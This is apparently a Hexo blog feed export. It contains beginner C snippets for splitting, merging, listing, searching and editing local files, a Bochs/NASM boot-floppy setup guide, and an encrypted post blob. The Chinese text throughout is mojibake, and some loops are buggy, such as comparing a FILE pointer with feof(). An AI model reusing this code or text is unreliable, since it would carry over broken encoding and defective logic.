class="built_in">sizeof</span>(<span class="type">char</span>*) * num);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		è·¯å¾„æ•°ç»„[i] = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>) * <span class="number">50</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(è·¯å¾„æ•°ç»„[i], <span class="string">&quot;C:\\Users\\test\\Desktop\\Project%d.exe&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, è·¯å¾„æ•°ç»„[i]);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	åˆ†å‰²(path, num);</span><br><span class="line">	åˆå¹¶(<span class="string">&quot;C:\\Users\\test\\Desktop\\back.exe&quot;</span>, num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(è·¯å¾„æ•°ç»„[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(è·¯å¾„æ•°ç»„);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥çœ‹ç›®å½•ä¸‹æ–‡ä»¶"><a href="#æŸ¥çœ‹ç›®å½•ä¸‹æ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹ç›®å½•ä¸‹æ–‡ä»¶"></a>æŸ¥çœ‹ç›®å½•ä¸‹æ–‡ä»¶</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> cmd[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="type">char</span>* path = <span class="string">&quot;C:\\Users\\test\\Desktop&quot;</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(cmd, <span class="string">&quot;dir /b /a:-d \&quot;%s\&quot;&quot;</span>,path);  <span class="comment">//dir /b ä»…ä»…æ˜¾ç¤ºæ–‡ä»¶å /a:-d æ’é™¤ç›®å½•</span></span><br><span class="line">	<span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ–‡æœ¬æ“ä½œ"><a href="#æ–‡æœ¬æ“ä½œ" class="headerlink" title="æ–‡æœ¬æ“ä½œ"></a>æ–‡æœ¬æ“ä½œ</h4><h5 id="è¯»å–txtå¹¶è¾“å‡º"><a href="#è¯»å–txtå¹¶è¾“å‡º" class="headerlink" title="è¯»å–txtå¹¶è¾“å‡º"></a>è¯»å–txtå¹¶è¾“å‡º</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> c[<span class="number">1000</span>];</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">fgets</span>(c, <span class="built_in">sizeof</span>(c), p)!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, c);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="åˆ†å‰²txtæ–‡æœ¬"><a href="#åˆ†å‰²txtæ–‡æœ¬" class="headerlink" title="åˆ†å‰²txtæ–‡æœ¬"></a>åˆ†å‰²txtæ–‡æœ¬</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> line = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> path[] = <span class="string">&quot;C:\\Users\\test\\Desktop\\test.txt&quot;</span>;</span><br><span class="line"><span class="type">char</span>** è·¯å¾„æ•°ç»„ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–æ–‡ä»¶å­—èŠ‚æ•°</span></span><br><span class="line"><span class="type">int</span> _getSize(<span class="type">char</span>* path) &#123;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(path, <span class="string">&quot;r&quot;</span>);	</span><br><span class="line">	<span class="built_in">fseek</span>(p, <span class="number">0</span>, SEEK_END);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> size = <span class="built_in">ftell</span>(p);</span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nåŸæ–‡ä»¶å¤§å°ä¸º:%d\n&quot;</span>,size);</span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _getLine() &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> c[<span class="number">1000</span>];</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">fgets</span>(c, <span class="built_in">sizeof</span>(c), p) != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;%s&quot;, c);</span></span><br><span class="line">		line++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;æ€»è¡Œæ•°ä¸º %d è¡Œ\n&quot;</span>,line);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> åˆ†å‰²(<span class="type">char</span>* path, <span class="type">int</span> num) &#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (line % num == <span class="number">0</span>) &#123;  <span class="comment">//å­—èŠ‚å¤§å°æ•´é™¤</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			FILE* åˆ†å‰²åçš„æ–‡ä»¶ = <span class="built_in">fopen</span>(è·¯å¾„æ•°ç»„[i], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; line / num; j++) &#123;</span><br><span class="line">				<span class="built_in">fputs</span>(<span class="built_in">fgets</span>(str,<span class="built_in">sizeof</span>(str), p), åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;		<span class="comment">//ä¸æ•´é™¤  æœ€åä¸€ä¸ªå•ç‹¬å¤„ç†</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num - <span class="number">1</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			FILE* åˆ†å‰²åçš„æ–‡ä»¶ = <span class="built_in">fopen</span>(è·¯å¾„æ•°ç»„[i], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; line / (num - <span class="number">1</span>); j++) &#123;</span><br><span class="line">				<span class="built_in">fputs</span>(<span class="built_in">fgets</span>(str,<span class="built_in">sizeof</span>(str), p), åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">fclose</span>(åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		FILE* åˆ†å‰²åçš„æ–‡ä»¶ = <span class="built_in">fopen</span>(è·¯å¾„æ•°ç»„[num - <span class="number">1</span>], <span class="string">&quot;w&quot;</span>); <span class="comment">//æœ€åä¸€ä¸ªè·¯å¾„</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; line % (num - <span class="number">1</span>); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">fputs</span>(<span class="built_in">fgets</span>(str,<span class="built_in">sizeof</span>(str), p), åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fclose</span>(åˆ†å‰²åçš„æ–‡ä»¶);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	_getLine();</span><br><span class="line">	<span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">	<span class="comment">//53  4  17*3+2</span></span><br><span class="line">	è·¯å¾„æ•°ç»„ = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>*) * num);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		è·¯å¾„æ•°ç»„[i] = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>) * <span class="number">50</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(è·¯å¾„æ•°ç»„[i], <span class="string">&quot;C:\\Users\\test\\Desktop\\Text%d.txt&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, è·¯å¾„æ•°ç»„[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	åˆ†å‰²(path, num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(è·¯å¾„æ•°ç»„[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(è·¯å¾„æ•°ç»„);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Text1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="keyword">while</span> (p != <span class="built_in">feof</span>(p)) &#123;</span><br><span class="line">		<span class="type">char</span> str[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">fgets</span>(str, <span class="number">255</span>, p);</span><br><span class="line">		<span class="type">char</span>* lpstr = <span class="built_in">strstr</span>(str, <span class="string">&quot;Windows&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (lpstr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ä¿®æ”¹"><a href="#ä¿®æ”¹" class="headerlink" title="ä¿®æ”¹"></a>ä¿®æ”¹</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	FILE* p2 = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Temp.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">feof</span>(p)) &#123;</span><br><span class="line">		<span class="type">char</span> str[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">fgets</span>(str, <span class="number">255</span>, p);</span><br><span class="line">		<span class="type">char</span>* lpstr = <span class="built_in">strstr</span>(str, <span class="string">&quot;Windows&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (lpstr != <span class="literal">NULL</span>) &#123;  <span class="comment">//æ‰¾åˆ°ç›¸å…³å­—ç¬¦è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">			<span class="built_in">fputs</span>(<span class="string">&quot;Linux&quot;</span>, p2); <span class="comment">//æ›¿æ¢ä¸ºLinux</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">fputs</span>(str, p2);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	<span class="built_in">fclose</span>(p2);</span><br><span class="line">	<span class="built_in">remove</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">rename</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Temp.txt&quot;</span>, <span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="æ’å…¥"><a href="#æ’å…¥" class="headerlink" title="æ’å…¥"></a>æ’å…¥</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	FILE* p = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	FILE* p2 = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Temp.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">feof</span>(p)) &#123;</span><br><span class="line">		<span class="type">char</span> str[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		<span class="built_in">fgets</span>(str, <span class="number">255</span>, p);</span><br><span class="line">		<span class="type">char</span>* lpstr = <span class="built_in">strstr</span>(str, <span class="string">&quot;Windows&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (lpstr != <span class="literal">NULL</span>) &#123;  <span class="comment">//æ‰¾åˆ°ç›¸å…³å­—ç¬¦åœ¨å…¶å‰åæ’å…¥å³å¯</span></span><br><span class="line">			<span class="comment">//printf(&quot;%s&quot;, str);</span></span><br><span class="line">			<span class="built_in">fputs</span>(<span class="string">&quot;Linux&quot;</span>, p2); </span><br><span class="line">			<span class="built_in">fputs</span>(str, p2);</span><br><span class="line">			<span class="built_in">fputs</span>(<span class="string">&quot;Linux&quot;</span>, p2);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">fputs</span>(str, p2);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fclose</span>(p);</span><br><span class="line">	<span class="built_in">fclose</span>(p2);</span><br><span class="line">	<span class="built_in">remove</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">rename</span>(<span class="string">&quot;C:\\Users\\test\\Desktop\\Temp.txt&quot;</span>, <span class="string">&quot;C:\\Users\\test\\Desktop\\test2.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>boshsä½¿ç”¨</title>
    <url>/posts/156d265c/</url>
    <content><![CDATA[<h3 id="å®‰è£…bochså’Œsdl"><a href="#å®‰è£…bochså’Œsdl" class="headerlink" title="å®‰è£…bochså’Œsdl"></a>å®‰è£…bochså’Œsdl</h3><p>brew install bochs</p>
<p>brew install sdl</p>
<h3 id="åˆ›å»ºè™šæ‹Ÿè½¯ç›˜"><a href="#åˆ›å»ºè™šæ‹Ÿè½¯ç›˜" class="headerlink" title="åˆ›å»ºè™šæ‹Ÿè½¯ç›˜"></a>åˆ›å»ºè™šæ‹Ÿè½¯ç›˜</h3><p>bximage</p>
<p>ä½¿ç”¨bximageå‘½ä»¤ç›´æ¥åˆ›å»ºç£ç›˜é•œåƒï¼Œé€‰æ‹©1åˆ›å»ºç£ç›˜ è¾“å…¥fdï¼Œè¡¨ç¤ºåˆ›å»ºè½¯ç›˜ é€‰æ‹©è½¯ç›˜çš„å¤§å°ï¼Œé»˜è®¤çš„1.44Må°±å¯ä»¥äº† è¾“å…¥é•œåƒçš„åç§°ï¼Œå¯ä»¥ä½¿ç”¨é»˜è®¤çš„é•œåƒåa.imgï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰åç§°boot.imgï¼Œåªè¦èƒ½è·Ÿé…ç½®æ–‡ä»¶ä¸­çš„åç§°å¯¹åº”å³å¯</p>
<h3 id="ç¼–å†™bootå¼•å¯¼ç¨‹åº"><a href="#ç¼–å†™bootå¼•å¯¼ç¨‹åº" class="headerlink" title="ç¼–å†™bootå¼•å¯¼ç¨‹åº"></a>ç¼–å†™bootå¼•å¯¼ç¨‹åº</h3><p>åˆ›å»ºä¸€ä¸ªboot.asmæ–‡ä»¶ ç¼–å†™ä»£ç  æ­¤å¤„asmç•¥</p>
<hr>
<h3 id="ç¼–è¯‘ç¨‹åº-å†™å…¥è½¯ç›˜"><a href="#ç¼–è¯‘ç¨‹åº-å†™å…¥è½¯ç›˜" class="headerlink" title="ç¼–è¯‘ç¨‹åº å†™å…¥è½¯ç›˜"></a>ç¼–è¯‘ç¨‹åº å†™å…¥è½¯ç›˜</h3><p>nasm boot.asm -o boot.bin</p>
<p>ç¼–è¯‘ç»“æŸåï¼Œå°†ç”Ÿæˆçš„äºŒè¿›åˆ¶ç¨‹åºboot.binå†™å…¥åˆ°boot.imgä¸­</p>
<p>ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„ddå‘½ä»¤ï¼ŒæŠŠBootç¨‹åºå¼ºåˆ¶å†™å…¥åˆ°è™šæ‹Ÿè½¯ç›˜çš„å›ºå®šæ‰‡åŒºä¸­</p>
<p>dd if=boot.bin of=boot.img bs=512 count=1 conv=notrunc</p>
<p>ifæŒ‡å®šè¾“å…¥æºæ–‡ä»¶åï¼ŒofæŒ‡å®šè¾“å‡ºæ–‡ä»¶åï¼Œcount=1æŒ‡å®šä¼ è¾“çš„å—å¤§å°ä¸º512Bï¼Œconv=notruncè§„å®šåœ¨å†™å…¥æ•°æ®åä¸æˆªæ–­è¾“å‡ºæ–‡ä»¶çš„å°ºå¯¸å¤§å°ã€‚ä»¥ä¸‹ä¸ºè¯¥å‘½ä»¤çš„æ‰§è¡Œæ—¥å¿—ä¿¡æ¯</p>
<h3 id="é…ç½®å¯åŠ¨ä¿¡æ¯"><a href="#é…ç½®å¯åŠ¨ä¿¡æ¯" class="headerlink" title="é…ç½®å¯åŠ¨ä¿¡æ¯"></a>é…ç½®å¯åŠ¨ä¿¡æ¯</h3><p>åˆ›å»ºä¸€ä¸ªbochsrcçš„é…ç½®æ–‡ä»¶</p>
<p>æ‰¾åˆ°bochså®‰è£…ç›®å½•ä¸‹çš„é…ç½®è·¯å¾„ï¼š/usr/local/Cellar/bochs/2.7/share/doc/bochs/bochsrc-sample.txt ï¼ˆmacä¸‹ï¼‰ å…³äºé…ç½®è·¯å¾„é—®é¢˜ï¼Œæ ‡å¿—å°±æ˜¯æ‰¾åˆ°bochsrc-sample.txtè¯¥æ–‡ä»¶ã€‚ä¸åŒçš„ç”µè„‘ã€ä¸åŒçš„bochsç‰ˆæœ¬å¯èƒ½ä¼šæœ‰åŒºåˆ«ã€‚ æ‹·è´bochsrc-sample.txtæ–‡ä»¶ï¼Œå¹¶é‡å‘½åä¸ºboshsrcï¼ˆå­˜æ”¾åœ¨é¡¹ç›®ç›®å½•ä¸‹ï¼‰ï¼ŒåŠ å…¥å¦‚ä¸‹é…ç½®</p>
<p>romimage: file=$BXSHARE/BIOS-bochs-latest  vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest floppya: 1_44=boot.img, status=inserted   # è¿™é‡Œé…ç½®ä¸ºå‰é¢ç”Ÿæˆçš„.img ä¸ç„¶ä¼šæ‰¾ä¸åˆ°è®¾å¤‡æŠ¥é”™ # ä»è½¯ç›˜å¯åŠ¨ boot: floppy #è¾“å‡ºæ—¥å¿— log: bochsout.txt # ç½®é¼ æ ‡ä¸å¯ç”¨ mouse: enabled=0 #é”®ç›˜é…ç½® keyboard: keymap=#$BXSHARE/keymaps/x11-pc-us.map #å†…å­˜å®¹é‡ megs: 32 #ä½¿ç”¨GUIç•Œé¢ display_library: sdl2 </p>
<h3 id="å¯åŠ¨bochs"><a href="#å¯åŠ¨bochs" class="headerlink" title="å¯åŠ¨bochs"></a>å¯åŠ¨bochs</h3><p>bochs -f bochsrc é€‰æ‹©6</p>
<hr>
<h3 id="å‡ºç°çš„é—®é¢˜åŠè§£å†³æ–¹å¼"><a href="#å‡ºç°çš„é—®é¢˜åŠè§£å†³æ–¹å¼" class="headerlink" title="å‡ºç°çš„é—®é¢˜åŠè§£å†³æ–¹å¼"></a>å‡ºç°çš„é—®é¢˜åŠè§£å†³æ–¹å¼</h3><ul>
<li><p>åœ¨è¿è¡Œæ—¶å‡ºç°äº†æŠ¥é”™ ï¼ˆBochs is exiting with the following message: [ ] bochsrc:955: Bochs is not compiled with lowlevel sound supportï¼‰ æŸ¥äº†ä¸‹æ˜¯å› ä¸ºåœ¨å¤åˆ¶åŸæ–‡ä»¶åéœ€è¦å°†soundå’Œspeakeræ³¨é‡Šæ‰</p>
</li>
<li><p>Device: [HD ] Message: ata0-0: could not open hard drive image file â€˜30M.sampleâ€™ ä¿®æ”¹é…ç½®ä¸­çš„ata0-master typeæ”¹æˆnone ata0-master: type=none, mode=flat, path=â€30M.sampleâ€ #ata0-master: type=disk, mode=flat, path=â€30M.sampleâ€</p>
</li>
<li><p>Device: [BIOS ] Message: No bootable device. é…ç½®æ–‡ä»¶ä¸­ floppya è®¾ç½®çš„.imgä½ç½®ä¸ä¸€è‡´ æ”¹æˆå¯¹åº”çš„.imgå³å¯</p>
</li>
</ul>
<hr>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://juejin.cn/post/7076052275600293918">https://juejin.cn/post/7076052275600293918</a></p>
<p><a href="https://blog.csdn.net/qq_44445809/article/details/123256063">https://blog.csdn.net/qq_44445809/article/details/123256063</a></p>
<p><a href="https://www.cnblogs.com/zengjfgit/p/5695173.html">https://www.cnblogs.com/zengjfgit/p/5695173.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>2022ä¸ŠåŠå¹´ä¸ªäººæ€»ç»“</title>
    <url>/posts/e7789fd3/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f7e017c8639df345ba68a123597a396de606577be8108500df4dcb768b56c222">de64d47ec3cf90f53a7fdcf21575326eb3e38821bd54060a735255ca2e8237659cdfaeccc78a904cfd1fe57b4e191c211de23e519cd207da184c8b52dd1d542e6092fa8ff3bb4ceaab9fc196b4655e2537f82c05b26550fdf0b66ba1c866173adb71ad0ef8ac7852877018b1a11aa76bdff82680fdfda4415ac5906f7ef9de9f22906edfa9632a289457f0aac130a124b7892377db753fe7b47d0be0d6e18c97ddb9bbd59627f10f1814e57c755f1c820ae17e258ec99018b061aaceedc63c156a11f05c803842986b68b246ab3bee4996d3804dd381560112efe8b3812a711cfb1c677c646087e6e2949dd6cb8d86b9fee42ae25aa7194da86ec049ea710c532eca9c8017dd81b68e2c2755c06b8c099015da671e7efe6af4fc3297937dcb7a7dcbe06fdd3c98fb8da09f5281fb1ffff94e1b044cb7390f1d5fb39745d24fbdea8b8278efa05b6f6cfaa80d20fd478138506683f03c84ba9552ceefefc7e33da340aa6048669e2497f961fd63756a394a7ac11bdb2ea9295c806a93e77afcb223dfb1bced0462b51b3c9647747bcf0dd3125864a08115f1f891fe43f8f4183c4ad732207a398ac98646587d752d0933d21aa6809fb27fd4567054d478468d36f3441ab26f687db2fffbc8507a317bf78818aee687bd82a4e2f14bb24f1ff624539cfdf9ad0eefabac8ec4f02a01bc17feb039fe9e2da3c189b5ee8ed19708fac220f7b60bed7b414abd4928785e22430ec615b16a38043eba3b6a48928a3a638cb6c02806eafd5004a36ed353aa0391b8ef31575109caabf93d044095a7591f920fc88ff42525b76e3a9d5049ab6cfe8f7ffca870778507dede041073e67d4a02e8e2cd7eb8cba57d9a7e34d0e5b83b9e301fbde7a3068587777018b1e737b63fbadce311f954d76a6f9fa62835f686b23797a0e227cd60a50ec81713910c6010ded4b4a6590db5269cb7fe70d2c79cab1872161845fa5955129a4347b8732e00369f7f9e561cd32438aefb60a3d1623b71a7bbaef9783e0e8efee78f9d1b0f183f1879a78d3d434fd09d30bf3b8b345c6d65986b51740eccc18852a7b4697c7142b4083453a0c35a2fc6e7bef0259217b60445a67aec12dd86f59ccf70075b1fbffd38b41577ff175551ea5e7f73145affbbf2c584fe8b388cc